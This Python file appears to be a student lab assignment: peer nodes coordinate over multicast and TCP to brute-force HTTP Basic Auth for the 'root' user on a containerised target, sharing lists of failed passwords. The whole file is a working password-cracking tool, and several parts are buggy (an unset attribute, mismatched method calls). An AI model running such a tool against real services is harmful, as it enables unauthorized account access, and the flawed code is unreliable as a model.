from os import system
import selectors
import socket, base64
import struct
import threading
import sys
import time
from random import SystemRandom, randint
import json
import argparse
from itertools import product
from string import ascii_letters,digits,ascii_lowercase,ascii_uppercase

from const import (
    BANNED_TIME,
    COOLDOWN_TIME,
    NEW_PENALTY,
    MIN_VALIDATE,
    MAX_VALIDATE,
    MIN_TRIES,
    MAX_TRIES,
    PASSWORD_SIZE
)

class Cracker:
    def __init__(self, ip='172.17.0.2'):
        self.host= ip
        self.port= 8000
        self.username= 'root'
        self.combinations = self.generate(PASSWORD_SIZE)
        self.msg_array = []
        self.index = 0
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.host, self.port))
        self.wrong_passwords = []
        self.correct_password = ""

    def generate(self,length)-> list:
        ret=[]
        for j in range(1, length):
            for i in product(ascii_letters + digits, repeat=j):
                ret.append(''.join(i))
        return ret

    def send_try(self):
        password= self.combinations[self.index]
        
        # send try
        token= base64.encodebytes(('%s:%s' % (self.username, password)).encode()).strip()
        lines= 'GET / HTTP/1.1\nHost: %s\nAuthorization: Basic %s\nConnection: keep-alive\n\n' % ( self.host, token.decode())
        self.s.send(lines.encode('utf-8'))

        # get response
        recv = self.s.recv(1024).decode("utf-8")
        msg_array = recv.split("\r\n")
        if 'HTTP/1.1 200 OK' in recv:
            # avisar que já descobriu a pass
            print("Acertou, parabéns")
            return True
        self.wrong_passwords.append(password)

        self.index += 1
        return False

    def get_passwords_list_size(self):
        return len(self.combinations)

    def get_wrong_passwords(self)->list:
        return self.wrong_passwords

    def add_wrong_password(self, passwords):
        for password in passwords:
            if (password not in self.wrong_passwords):
                self.wrong_passwords.append(password)

class Server:
    def __init__(self, p2p):
        self.p2p = p2p
        self.connections = []
        self.peers = []
        self.MC_GROUP = "224.0.0.69"
        self.MC_PORT = 10000
        self.mc_address = (self.MC_GROUP, self.MC_PORT)
        self.multi_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.multi_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.multi_sock.bind(("", self.MC_PORT))
        group = socket.inet_aton(self.MC_GROUP)
        mreq = struct.pack("4sL", group, socket.INADDR_ANY)
        self.multi_sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

        self.sel = selectors.DefaultSelector()
        self.sel.register(self.multi_sock, selectors.EVENT_READ, self.receive_multicast_messages)

        self.cracker = Cracker()

        self.n_tries = 0
        self.limit = self.cracker.get_passwords_list_size()
        self.ipslave = socket.gethostbyname(socket.gethostname())
        print(self.ipslave)

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('', 8000))
        self.sock.listen(1)

        self.sel.register(self.sock, selectors.EVENT_READ, self.receive_message)

        print("Server running...")

        self.send_multicast_message({"command":"keep_alive","slave": self.peers,"ip":self.ipslave})
        self.send_multicast_message({"command":"keep_alive","slave": self.peers,"ip":self.ipslave})

        self.handler()

    def accept_conns(self):
        self.sock.settimeout(1)
        try:
            c, a = self.sock.accept()
            self.connections.append(c)
            self.peers.append(a)
            print(str(a[0]) + ':' + str(a[1]), " connected.")
            self.send_ack(c)
        except socket.timeout:
            pass

    def handler(self):
        while self.n_tries < self.limit:
            if self.found_it:
                sys.exit(0)

            if not self.found_it:
                if (self.cracker.send_try()):
                    msg = {"command":"found_it", "ip": self.ipslave}
                    self.found_it = True
                    self.send_message(msg)

                self.n_tries += 1
                if self.n_tries % (MIN_TRIES - 1) ==  0:
                    print("---------------------entrei---------------------------")
                    print(self.n_tries)
                    print(self.peers)
                    

                    self.accept_conns()
                    print("vou enviar unicast")
                    self.send_message()
                    print("vou enviar multicast")
                    self.send_multicast_message({"command":"keep_alive", "ip":self.ipslave})
                    time.sleep(COOLDOWN_TIME/1000)
                    print("A MINHA LISTA ATUAL")
                    print(self.peers)

                    events = self.sel.select(timeout=5)
                    for key, mask in events:
                        callback = key.data
                        callback()

                    if not events:
                        print("não recebi nada")

        print("Não descobri nada")

    def receive_message(self):
        x = 0
        print(self.connections)
        for c in self.connections:
            print("recebi")
            data = c.recv(1024)
            print(data.decode("utf_8"))
            if not data:
                print(str(self.peers[x][0]) + ':' + str(self.peers[x][1]), " disconnected.")
                self.connections.remove(c)
                self.peers.remove(self.peers[x])
                x -= 1
                c.close()
            else:
                msg = json.loads(data.decode("utf-8"))
                print(msg)

                if (msg["command"] == "sync"):
                    self.cracker.add_wrong_password(msg["wrongs"])
                elif (msg["command"] == "found_it"):
                    msg = {"command":"found_it_ack"}
                    self.send_message(msg)
                    self.found_it = True
                elif (msg["command"] == "found_it_ack"):
                    pass
            x += 1
        

    def send_message(self):
        for c in self.connections:
            msg_envio = {"command":"sync", "slave": self.peers, "ip": self.ipslave, "wrongs": self.cracker.get_wrong_passwords()}
            message = json.dumps(msg_envio).encode("utf-8")
            c.send(message)

    def send_ack(self, conn):
        print("a enviar ack")
        msg_envio = {"command":"connecting_ack", "slave":self.peers, "ip":self.ipslave,"wrongs": self.cracker.get_wrong_passwords()}
        message=json.dumps(msg_envio).encode("utf-8")
        conn.send(message)

    def send_multicast_message(self,msg):
        try:
            # Send data to the multicast group
            msg_envio = msg
            self.multi_sock.sendto(json.dumps(msg_envio).encode("utf-8"), self.mc_address)
            print(json.dumps(msg_envio))
        except:
            print("erro a enviar em multicast")
            pass

    def receive_multicast_messages(self):
        data, address = self.multi_sock.recvfrom(1024)
        print("GOT", data, "from", address)

class Client:
       
    def __init__(self, address, p2p):
        self.p2p = p2p
        self.connections = []
        self.peers = []
        self.found_it = False
        self.cracker = Cracker()
        self.n_tries = 0
        self.limit = self.cracker.get_passwords_list_size()
        self.ipslave = socket.gethostbyname(socket.gethostname())

        print(self.ipslave)

        self.sel = selectors.DefaultSelector()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.connect((address, 8000))

        self.sel.register(self.sock, selectors.EVENT_READ, self.receive_message)
        self.send_message({"command":"connecting","ip":self.ipslave})

    def handler(self):
        while self.n_tries < self.limit:
            if self.found_it:
                print("Found it already")
                sys.exit(0)

            if (self.cracker.send_try()):
                msg = {"command":"found_it", "ip": self.ipslave}
                self.found_it = True
                self.send_message(msg)
                sys.exit(0)

            self.n_tries += 1
            if self.n_tries % (MIN_TRIES - 1) ==  0:
                print("---------------------entrei---------------------------")
                print(self.peers)
                
                self.send_message()
                time.sleep(COOLDOWN_TIME/1000)      

        print("Não descobri nada")

    def receive_message(self):
        self.sock.settimeout(1)
        try:
            data, address = self.sock.recvfrom(1024).decode("utf-8")
        except socket.timeout:
            return

        data = json.loads(data)

        if (address not in self.connections):
            self.connections.append(address)
        
        print("a receber")
        print(data)

        if not data:
            print("nada")
        elif data["command"] == "connecting_ack":
            self.update_peers(data["slave"])
        elif data["command"] == "sync":
            print("Recebi o Sync")
            self.update_peers(data["slave"])
            self.cracker.add_wrong_password(data["wrongs"])
        elif data["command"] == "found_it":
            msg = {"command":"found_it_ack"}
            self.send_message(msg)
            self.found_it = True
        elif data["command"] == "found_it_ack":
            sys.exit(0)
        else:
            print(str(data, 'utf-8'))

    def send_message(self, msg_envio = ""):
        if msg_envio == "":
            msg_envio = {"command":"sync", "slave": self.peers, "ip": self.ipslave, "wrongs": self.cracker.get_wrong_passwords()}
        message = json.dumps(msg_envio).encode("utf-8")
        msg_len = len(message).to_bytes(2, byteorder='big')

        print("a enviar")
        print(message)

        self.sock.send(msg_len)
        self.sock.send(message)

    def update_peers(self, peer_data):
        for i in peer_data:
            if (i not in p2p.peers and i != self.ipslave):
                self.peers.append(i)

class p2p:
    peers = []

    def __init__(self):
        self.msg = ""
        self.server = ""

    def findServer(self):
        print("entrei no findServer")

        self.msg = ""
        self.server = ""

        MC_GROUP = "224.0.0.69"
        MC_PORT = 10000
        mc_address = (MC_GROUP, MC_PORT)

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.sock.bind(("", MC_PORT))
        group = socket.inet_aton(MC_GROUP)
        mreq = struct.pack("4sL", group, socket.INADDR_ANY)

        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.sock.settimeout(1)

        try:
            data, address = self.sock.recvfrom(1024)
            if data:
                got_it = True
                self.msg = data.decode("utf-8")
                self.server = address
        except socket.timeout:
            print("não recebi nada")

        print(self.server)

        return (self.msg, self.server)

class Slave:
    def __init__(self):
        self.p2p = p2p()

    def exec(self):
        while True:
            ret = self.p2p.findServer()
            try:        
                if ret[0] != "":
                    print("Trying to connect...")
                    try:
                        client = Client(ret[1][0], self.p2p)
                    except KeyboardInterrupt:
                        sys.exit(0)
                    except:
                        pass
                else:
                    n = randint(1, 10)
                    print(n)
                    if n == 1:
                        server = Server(self.p2p)
                        
            except KeyboardInterrupt:
                sys.exit(0)
            except:
                print("deu merda")


if __name__ == '__main__':
    slave = Slave()
    slave.exec()